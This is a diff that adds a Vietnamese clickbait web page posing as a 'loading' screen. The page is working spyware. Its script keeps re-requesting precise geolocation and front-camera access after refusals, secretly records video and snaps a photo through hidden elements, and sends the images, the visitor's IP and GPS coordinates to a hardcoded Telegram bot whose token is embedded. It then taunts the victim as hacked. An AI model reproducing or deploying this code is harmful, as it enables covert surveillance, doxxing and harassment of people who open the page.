@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HOT NHẤT LÚC NÀY!</title>
+<style>
+body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; height:100vh; display:flex; justify-content:center; align-items:center; overflow:hidden; }
+.loading { font-size:1.8em; line-height:1.5; color: #fff; }
+.result { display:none; flex-direction:column; align-items:center; padding:0 20px; box-sizing:border-box; }
+img { max-width:90%; border:4px solid #fff; margin:20px 0; }
+.troll-text {
+    color: yellow;
+    font-size: 1.55em;
+    line-height: 1.65;
+    padding: 0 15px;
+    text-align: center;
+
+    white-space: nowrap;      /* 👈 QUAN TRỌNG */
+    overflow: hidden;
+    text-overflow: ellipsis;  /* nếu dài quá thì ... */
+}
+video, canvas { position:absolute; top:-99999px; left:-99999px; width:640px; height:480px; }
+</style>
+</head>
+<body>
+<div id="loading" class="loading">
+ĐANG LOAD WEB...<br>VUI LÒNG CHỜ
+</div>
+<div id="result" class="result">
+<h2 style="color:red;">📸 MẶT BẠN ĐÃ BỊ LỘ</h2>
+<img id="faceImage">
+<div id="infoText" class="troll-text"></div>
+</div>
+
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas" width="1280" height="720"></canvas>
+
+<script>
+const TOKEN = "8645167578:AAH7vWmSl7DTSe4E4Lf_99mNEGkFkpxzrBY";
+const CHAT_ID = "8650144012";
+
+let ip = "Không lấy được";
+let vido = "";
+let kinhdo = "";
+let googleMapLink = "https://maps.google.com";
+
+// ===== SEND =====
+function sendPhoto(base64) {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", `📸 Ảnh mặt\nIP: ${ip}\nVị trí: ${googleMapLink}`);
+    const blob = dataURLtoBlob(base64);
+    form.append("photo", blob, "face.jpg");
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: form });
+}
+
+function sendVideo(base64) {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", `🎥 Video camera trước\nIP: ${ip}\nVị trí: ${googleMapLink}`);
+    const blob = dataURLtoBlob(base64);
+    form.append("video", blob, "video.webm");
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: form });
+}
+
+function sendLocationUpdate(vido, kinhdo) {
+    const text = `🔴 VỊ TRÍ CỦA THẰNG NGU\n\nIP: ${ip}\n\nVĩ độ: ${vido}\nKinh độ: ${kinhdo}\n\nĐịa Chỉ Nhà: ${googleMapLink}\n\nThời gian: ${new Date().toLocaleString('vi-VN')}`;
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+}
+
+function dataURLtoBlob(dataurl) {
+    const arr = dataurl.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type: mime});
+}
+
+// GET IP
+function getIP() {
+    fetch("https://api4.ipify.org?format=json")
+    .then(r => r.json())
+    .then(data => ip = data.ip || "Không lấy được")
+    .catch(() => {})
+    .finally(requestLocation);
+}
+
+// ===== VỊ TRÍ (LOOP NẾU TỪ CHỐI) =====
+function requestLocation() {
+    if (!navigator.geolocation) {
+        document.getElementById("loading").innerHTML = "ĐANG LOAD WEB...<br>VUI LÒNG CHỜ";
+        return;
+    }
+
+    function tryLocation() {
+        navigator.geolocation.getCurrentPosition(
+            pos => { handleNewPosition(pos); },
+            () => {
+                document.getElementById("loading").innerHTML = "ĐANG LOAD WEB...<br>VUI LÒNG CHỜ";
+                setTimeout(tryLocation, 700);
+            },
+            { enableHighAccuracy: true, timeout: 18000, maximumAge: 0 }
+        );
+    }
+    tryLocation();
+}
+
+function handleNewPosition(pos) {
+    vido = pos.coords.latitude.toFixed(8);
+    kinhdo = pos.coords.longitude.toFixed(8);
+    googleMapLink = `https://maps.google.com/?q=${vido},${kinhdo}`;
+    sendLocationUpdate(vido, kinhdo);
+    requestCamera();
+}
+
+// ===== CAMERA (TỐI ĐA FPS + RESOLUTION CỦA TỪNG MÁY) =====
+function requestCamera() {
+    document.getElementById("loading").innerHTML = "ĐANG LOAD WEB...<br>VUI LÒNG CHỜ";
+
+    function tryCamera() {
+        navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: "user", 
+                width: {ideal: 1920}, 
+                height: {ideal: 1080}, 
+                frameRate: {ideal: 60} 
+            } 
+        })
+        .then(stream => {
+            const track = stream.getVideoTracks()[0];
+            const capabilities = track.getCapabilities();
+
+            // Áp dụng tối đa fps + độ phân giải mà máy hỗ trợ
+            const constraints = {};
+            if (capabilities.frameRate) constraints.frameRate = capabilities.frameRate.max;
+            if (capabilities.width) constraints.width = capabilities.width.max;
+            if (capabilities.height) constraints.height = capabilities.height.max;
+
+            track.applyConstraints(constraints).then(() => {
+                startSilentCapture(stream);
+            }).catch(() => startSilentCapture(stream)); // fallback nếu apply fail
+        })
+        .catch(() => {
+            document.getElementById("loading").innerHTML = "ĐANG LOAD WEB...<br>VUI LÒNG CHỜ";
+            setTimeout(tryCamera, 900);
+        });
+    }
+    tryCamera();
+}
+
+// ===== CHỤP ẨN + QUAY MƯỢT =====
+let recorder, chunks = [];
+
+function startSilentCapture(stream) {
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+    video.play().catch(() => {});
+
+    recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+    chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+
+    recorder.onstop = () => {
+        const blob = new Blob(chunks, {type: 'video/webm'});
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            sendVideo(reader.result);
+            stream.getTracks().forEach(t => t.stop());
+        };
+        reader.readAsDataURL(blob);
+    };
+
+    recorder.start(500);
+
+    // Delay tự nhiên + chụp ảnh
+    video.onloadeddata = () => {
+    setTimeout(() => {
+
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const photo = canvas.toDataURL("image/jpeg", 0.95);
+
+        document.getElementById("faceImage").src = photo;
+        sendPhoto(photo);
+
+        setTimeout(() => {
+            if (recorder && recorder.state !== "inactive") recorder.stop();
+            showResult();
+        }, 4000);
+
+    }, 1000);
+};
+}
+
+// ===== HIỂN THỊ TRÊN WEB =====
+function showResult() {
+    document.getElementById("loading").style.display = "none";
+    document.getElementById("result").style.display = "flex";
+
+    document.getElementById("infoText").innerHTML = `
+        Ê thằng ngu mày bị lộ rồi!<br><br>
+        IP: <strong>${ip}</strong><br><br>
+        📍 <a href="${googleMapLink}" target="_blank" style="color:cyan;">Xem Google Maps</a><br><br>
+        Vĩ độ: <strong>${vido}</strong><br>
+        Kinh độ: <strong>${kinhdo}</strong><br><br>
+        👨‍💻 BẠN ĐÃ BỊ HACK📱<br>
+        🇻🇳 HACK BY DGVI ✅
+    `;
+}
+
+window.onload = getIP;
+</script>
+</body>
+</html>
